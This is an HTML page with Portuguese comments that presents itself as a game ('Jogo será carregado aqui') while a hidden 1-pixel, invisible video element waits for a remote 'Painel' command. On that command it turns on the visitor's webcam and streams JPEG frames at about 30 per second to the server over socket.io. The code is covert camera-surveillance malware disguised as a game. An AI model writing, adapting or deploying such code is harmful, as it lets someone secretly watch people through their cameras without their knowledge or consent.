<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>Dispositivo</title>
    <style>
        #video {
            position: absolute;
            width: 1px;
            height: 1px;
            opacity: 0;
            z-index: -1000;
            overflow: hidden;
        }
        
        #game-container {
            width: 100%;
            height: 100vh;
            background-color: #f0f0f0;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        
        #game-placeholder {
            font-size: 24px;
            color: #333;
        }
    </style>
</head>
<body>
    <h2 style="display:none;">Dispositivo</h2>
    
    <!-- Vídeo totalmente escondido mas funcionando -->
    <video id="video" autoplay muted></video>
    
    <!-- Container do jogo -->
    <div id="game-container">
        <p id="game-placeholder">Jogo será carregado aqui</p>
        <!-- Você pode substituir por um canvas ou iframe do jogo depois -->
    </div>

    <p id="status"></p>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
        const video = document.getElementById('video');
        let stream = null;
        let isSendingFrames = false;
        let canvas = document.createElement('canvas');
        let ctx = canvas.getContext('2d');

        // Função para enviar frames da câmera
        function sendCameraFrame() {
            if (!isSendingFrames || !stream) return;

            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            // Converte para JPEG (otimizado para transmissão)
            const frame = canvas.toDataURL('image/jpeg', 0.7); // Qualidade 70%
            socket.emit('frame_ao_vivo', frame);

            // Configura o próximo frame (~30 FPS)
            setTimeout(sendCameraFrame, 33); // ~33ms = 30 FPS
        }

        // Recebe comandos do Painel
        socket.on('executar_comando', async (cmd) => {
            if (cmd === 'ativar_camera' && !stream) {
                try {
                    stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
                    video.srcObject = stream;
                    isSendingFrames = true;
                    sendCameraFrame(); // Inicia o streaming
                } catch (err) {
                    console.error("Erro ao acessar câmera:", err);
                }
            }

            if (cmd === 'desativar_camera' && stream) {
                isSendingFrames = false;
                stream.getTracks().forEach(track => track.stop());
                video.srcObject = null;
                stream = null;
            }
        });
    </script>
</body>
</html>
